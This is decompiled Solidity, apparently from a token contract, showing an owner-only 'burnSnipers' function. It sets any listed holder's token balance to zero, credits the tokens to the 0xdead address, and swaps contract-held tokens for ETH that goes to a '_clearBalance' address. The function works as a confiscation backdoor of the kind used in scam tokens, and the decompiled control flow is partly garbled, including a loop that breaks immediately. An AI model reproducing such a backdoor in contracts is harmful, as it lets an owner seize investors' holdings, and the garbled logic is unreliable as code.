function burnSnipers(address[] varg0) public nonPayable { 

    require(msg.data.length - 4 >= 32);

    require(varg0 <= 0xffffffffffffffff);

    require(4 + varg0 + 31 < msg.data.length);

    require(varg0.length <= 0xffffffffffffffff, Panic(65));

    require(!((MEM[64] + ((varg0.length << 5) + 63 & ~0x1f) > 0xffffffffffffffff) | (MEM[64] + ((varg0.length << 5) + 63 & ~0x1f) < MEM[64])), Panic(65));

    MEM[64] = MEM[64] + ((varg0.length << 5) + 63 & ~0x1f);

    v0 = v1 = MEM[64] + 32;

    require(32 + ((varg0.length << 5) + (4 + varg0)) <= msg.data.length);

    v2 = v3 = 36 + varg0;

    while (v2 < 32 + ((varg0.length << 5) + (4 + varg0))) {

        require(msg.data[v2] == address(msg.data[v2]));

        MEM[v0] = msg.data[v2];

        v2 += 32;

        v0 += 32;

    }

    require(msg.sender == _getOwner, Error('Ownable: caller is not the owner'));

    v4 = v5 = 0;

    while (v4 < varg0.length) {

        if (v4 < varg0.length) {

            break;

        }

        require(v4 < varg0.length, Panic(50));

        v6 = MEM[32 + (v4 << 5) + MEM[64]];

        if (v4 < varg0.length) {

            break;

        }

        require(v4 < varg0.length, Panic(50));

        v7 = v8 = _balanceOf[address(MEM[32 + (v4 << 5) + MEM[64]])];

        if (!stor_10_0_0) {

            0x1234(v8, v6);

            v9 = _pair != 57005;

            if (_pair != 57005) {

                v9 = v10 = 57005 != 57005;

            }

            if (v9) {

                v11 = v12 = 0xff & owner_7[0xdead];

                if (!v12) {

                    v13 = _SafeAdd(_balanceOf[57005], v8);

                    v11 = v13 <= __maxWalletSize;

                }

                require(v11, Error('Transfer amount exceeds the bag size.'));

            }

            v14 = 0x129d();

            if (v14) {

                stor_10_0_0 = 1;

                v15 = v16 = _balanceOf[this];

                v17 = _SafeMul(4, _swapThreshold);

                if (v16 >= v17) {

                    v15 = v18 = _SafeMul(4, _swapThreshold);

                }

                v19 = new uint256[](2);

                CALLDATACOPY(v19.data, msg.data.length, 64);

                require(0 < v19.length, Panic(50));

                v20 = v19.data;

                v19[0] = address(this);

                require(1 < v19.length, Panic(50));

                v19[1] = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;

                MEM[MEM[64]] = 0x791ac94700000000000000000000000000000000000000000000000000000000;

                MEM[4 + MEM[64]] = v15;

                MEM[4 + MEM[64] + 32] = 0;

                MEM[4 + MEM[64] + 64] = 160;

                MEM[4 + MEM[64] + 160] = v19.length;

                v21 = v22 = 4 + MEM[64] + 192;

                v23 = v19.data;

                v24 = 0;

                while (v24 < v19.length) {

                    MEM[v21] = address(MEM[v23]);

                    v23 += 32;

                    v21 += 32;

                    v24 += 1;

                }

                MEM[4 + MEM[64] + 96] = address(this);

                MEM[132 + MEM[64]] = block.timestamp;

                require(_router.code.size);

                v25 = _router.call(MEM[(MEM[64]) len (v21 - MEM[64])], MEM[(MEM[64]) len 0]).gas(msg.gas);

                require(v25); // checks call status, propagates error data on error

                if (this.balance >= 0x16345785d8a0000) {

                    v26 = _clearBalance.call().value(this.balance).gas(2300 * !this.balance);

                    require(v26); // checks call status, propagates error data on error

                }

                stor_10_0_0 = 0;

            }

            v27 = new struct(2);

            v27.word0 = 20;

            v28 = v27.data;

            v27.word1 = 'Insufficient Balance';

            v29 = _SafeSub(v27, v8, _balanceOf[address(v6)]);

            _balanceOf[address(v6)] = v29;

            if (!(0xff & owner_6[address(v6)])) {

                v7 = v30 = 0x1486(v8, 57005, v6);

            }

            v31 = 0x1521(v7, _balanceOf[57005]);

            _balanceOf[57005] = v31;

            MEM[MEM[64]] = v7;

            emit Transfer(address(v6), 57005);

            goto 0xb04B0x540;

        } else {

            v32 = new struct(2);

            v32.word0 = 20;

            v33 = v32.data;

            v32.word1 = 'Insufficient Balance';

            v34 = _SafeSub(v32, v8, _balanceOf[address(v6)]);

            _balanceOf[address(v6)] = v34;

            v35 = 0x1521(v8, _balanceOf[address(v6)]);

            _balanceOf[57005] = v35;

            MEM[MEM[64]] = v8;

            emit Transfer(address(v6), 57005);

        }

        require(v4 != ~0, Panic(17));

        v4 += 1;

    }

}
